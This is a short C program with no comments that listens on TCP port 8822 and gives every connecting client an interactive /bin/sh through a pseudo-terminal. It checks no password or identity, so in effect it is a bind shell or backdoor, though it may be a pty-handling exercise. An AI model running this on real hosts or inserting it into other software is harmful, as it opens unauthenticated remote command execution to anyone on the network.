#include <pty.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <stdio.h>
#include <sys/wait.h>
#include <stdlib.h>

#define LISTEN_BACKLOG 50

int check(const char * message, int result) {
    if (result == -1) {
        perror(message);
        _exit(1);
    }
    return result;
}

void write_(int fd, char * buffer, int size) {
    int done = 0;
    while (done < size) {
        done += check("write", write(fd, buffer + done, size - done));
    }
}

void close_(int fd) {
    check("close", close(fd));
}

void dup2_(int fd1, int fd2) {
    check("dup2", dup2(fd1, fd2));
}

int main() {
    int pid = check("fork", fork());
    if (pid) {
        int status;
        waitpid(pid, &status, 0);
        return 0;
    }
    check("setsid", setsid());
    struct addrinfo hints;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_flags = AI_PASSIVE;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo * result;
    if (getaddrinfo(0, "8822", &hints, &result) != 0) {
        printf("getaddrinfo() failed\n");
        _exit(1);
    }
    int socketfd = check("socket", socket(result->ai_family, result->ai_socktype, result->ai_protocol));
    int option = 1;
    check("setsockopt", setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, (char *) &option, sizeof(option)));
    check("bind", bind(socketfd, result->ai_addr, result->ai_addrlen));
    check("listen", listen(socketfd, LISTEN_BACKLOG));
    while (1) {
        printf("waiting for connection\n");
        int acceptedfd = check("accept", accept(socketfd, NULL, NULL));
        int acceptedpid = check("fork", fork());
        if (acceptedpid) {
            close_(acceptedfd);
        } else {
            close_(socketfd);
            char * hello = "hello, world\n";
            write_(acceptedfd, hello, strlen(hello));
            int master, slave;
            char buf[4096];
            check("openpty", openpty(&master, &slave, buf, NULL, NULL));
            if (check("fork", fork())) {
                close_(slave);
                int buffer_size = 4096;
                char * buffer = malloc(buffer_size);
                if (buffer == NULL) {
                    char * message = "malloc() failed";
                    write_(1, message, strlen(message));
                    _exit(1);
                }
                check("fcntl", fcntl(master, F_SETFL, O_NONBLOCK));
                check("fcntl", fcntl(acceptedfd, F_SETFL, O_NONBLOCK));
                while (1) {
                    int r = read(master, buffer, buffer_size);
                    if (r > 0) {
                        write_(acceptedfd, buffer, r);
                    } else if (r == 0) {
                        break;
                    }

                    r = read(acceptedfd, buffer, buffer_size);
                    if (r > 0) {
                        write_(master, buffer, r);
                    } else if (r == 0) {
                        break;
                    }
                }
                free(buffer);
                close_(master);
                close_(acceptedfd);
            } else {
                close_(master);
                close_(acceptedfd);
                check("setsid", setsid());
                int fd = check("open", open(buf, O_RDWR));
                close_(fd);

                dup2_(slave, 0);
                dup2_(slave, 1);
                dup2_(slave, 2);
                close_(slave);
                execl("/bin/sh", "/bin/sh", NULL);
            }
        }
    }
    return 0;
}
